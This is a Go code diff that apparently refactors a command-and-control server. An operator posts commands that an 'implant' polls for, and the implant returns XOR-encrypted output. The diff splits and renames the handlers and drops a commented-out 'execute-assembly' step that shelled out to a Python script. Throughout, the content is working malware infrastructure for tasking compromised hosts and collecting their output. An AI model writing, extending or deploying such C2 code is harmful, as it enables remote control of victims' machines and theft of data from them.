@@ -15,7 +15,7 @@ var (
 )
 
 // Method for the operator to actually send the command to the implant
-func fetchCommand(w http.ResponseWriter, r *http.Request) {
+func getCommand(w http.ResponseWriter, r *http.Request) {
 	defer r.Body.Close()
 
 	// Set the response content type to JSON
@@ -23,39 +23,6 @@ func fetchCommand(w http.ResponseWriter, r *http.Request) {
 
 	// Define a switch statement to handle GET or POST requests
 	switch r.Method {
-	case "POST":
-		// If the request is a POST, which would ideally be the operator sending the command
-		// Receive the request for the command, unmarshal it into the Command struct
-		var command Command
-		decoder := json.NewDecoder(r.Body)
-		if err := decoder.Decode(&command); err != nil {
-			http.Error(w, err.Error(), http.StatusBadRequest)
-			return
-		}
-
-		// With the Mutex, we store it in memory
-		mu.Lock()
-		// if command.Input == "execute-assembly" {
-		// 	// Run the Python script and capture the output
-		// 	fmt.Println("Getting assembly...")
-		// 	cmd := "cmd"
-		// 	args := []string{"/c", "python", "Vagrant_SSH.py", "-df", "/home/superstar/" + command.File + ""}
-		// 	fmt.Println(cmd, args)
-		// 	out, err := exec.Command(cmd, args...).Output()
-		// 	if err != nil {
-		// 		http.Error(w, err.Error(), http.StatusInternalServerError)
-		// 		return
-		// 	}
-
-		// 	// Override the File field with the output from the Python script
-		// 	command.File = strings.TrimSpace(string(out))
-		// }
-		storedCommand = &command
-		mu.Unlock()
-
-		w.WriteHeader(http.StatusOK)
-		fmt.Println("Fetching command:", command.Input, "for Implant User:", command.ImplantUser, "From Operator:", command.Operator)
-
 	case "GET":
 		// If the request is a GET request, we unlock the Mutex and release the command for the implant
 		mu.RLock()
@@ -88,12 +55,33 @@ func fetchCommand(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+func postCommand(w http.ResponseWriter, r *http.Request) {
+	defer r.Body.Close()
+	w.Header().Set("Content-Type", "application/json")
+	// If the request is a POST, which would ideally be the operator sending the command
+	// Receive the request for the command, unmarshal it into the Command struct
+	var command Command
+	decoder := json.NewDecoder(r.Body)
+	if err := decoder.Decode(&command); err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	// With the Mutex, we store it in memory
+	mu.Lock()
+	storedCommand = &command
+	mu.Unlock()
+
+	w.WriteHeader(http.StatusOK)
+	fmt.Println("Fetching command:", command.Input, "for Implant User:", command.ImplantUser, "From Operator:", command.Operator)
+}
+
 // Define the buffer that will store the XOR encrypted output
 var outputBuffer []byte
 var bufferMutex sync.Mutex
 
 // This method will receive the output from the implant
-func fetchOutput(w http.ResponseWriter, r *http.Request) {
+func postOutput(w http.ResponseWriter, r *http.Request) {
 	defer r.Body.Close()
 
 	// Upon receiving the output, read it and store the body
@@ -111,7 +99,7 @@ func fetchOutput(w http.ResponseWriter, r *http.Request) {
 	bufferMutex.Unlock()
 }
 
-func getStoredOutput(w http.ResponseWriter, r *http.Request) {
+func getOutput(w http.ResponseWriter, r *http.Request) {
 	// We first unlock the stored mutex which holdes the Output struct and put it inside a variable
 	bufferMutex.Lock()
 	output := outputBuffer
